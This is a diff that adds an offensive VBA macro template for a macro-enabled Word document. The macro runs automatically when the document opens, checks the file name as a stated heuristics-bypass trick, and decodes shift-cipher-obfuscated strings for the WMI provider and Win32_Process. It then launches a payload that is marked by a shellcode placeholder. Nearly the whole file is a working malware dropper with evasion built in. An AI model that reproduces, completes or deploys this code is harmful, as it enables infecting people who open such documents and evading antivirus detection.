@@ -1,0 +1,77 @@
+//####DEFINE####
+
+//####CODE####
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Function Grass(Goats)
+    Grass = Chr(Goats - 17)
+End Function
+
+Function RecMaster(Grapes)
+    RecMaster = Left(Grapes, 3)
+End Function
+
+Function SlaveCon(Topside)
+    SlaveCon = Right(Topside, Len(Topside) - 3)
+End Function
+
+Function ThinyColor(Troop)
+    Do
+        Shazam = Shazam + Grass(RecMaster(Troop))
+        Troop = SlaveCon(Troop)
+    Loop While Len(Troop) > 0
+    ThinyColor = Shazam
+End Function
+
+Function MyMacro()
+
+    //####EVASION####
+
+    Dim Leap As String
+
+     'Simple heuristics bypass attempt. Ensure file is named 'app.docm' (in vbObfuscate.ps1)
+    If ActiveDocument.Name <> "Evil_VBA.docm" Then
+        Exit Function
+    End If
+    ' Our encoded shellcode
+
+    buf = ####SHELLCODE####
+
+    //####CALL####
+    
+    ' Check if input is already a string
+    If VarType(buf) = vbString Then
+        Leap = buf
+    Else
+        ' Convert array to string
+        Leap = ArrayToString(buf)
+    End If
+
+    ' Call the Win32_Process.Create() Method of the Win32 WMI Provider "winmgmts:" (in vbObfuscate.ps1)
+    GetObject(ThinyColor("136122127126120126133132075")).Get(ThinyColor("104122127068067112097131128116118132132")).Create Leap, Tea, Coffee, Napkin
+End Function
+
+Private Function ArrayToString(arr As Variant) As String
+    On Error GoTo ErrorHandler
+    
+    Dim result As String
+    Dim i As Long
+    
+    result = ""
+    For i = LBound(arr) To UBound(arr)
+        result = result & Chr(arr(i))
+    Next i
+    
+    ArrayToString = result
+    Exit Function
+
+ErrorHandler:
+    ArrayToString = ""
+End Function
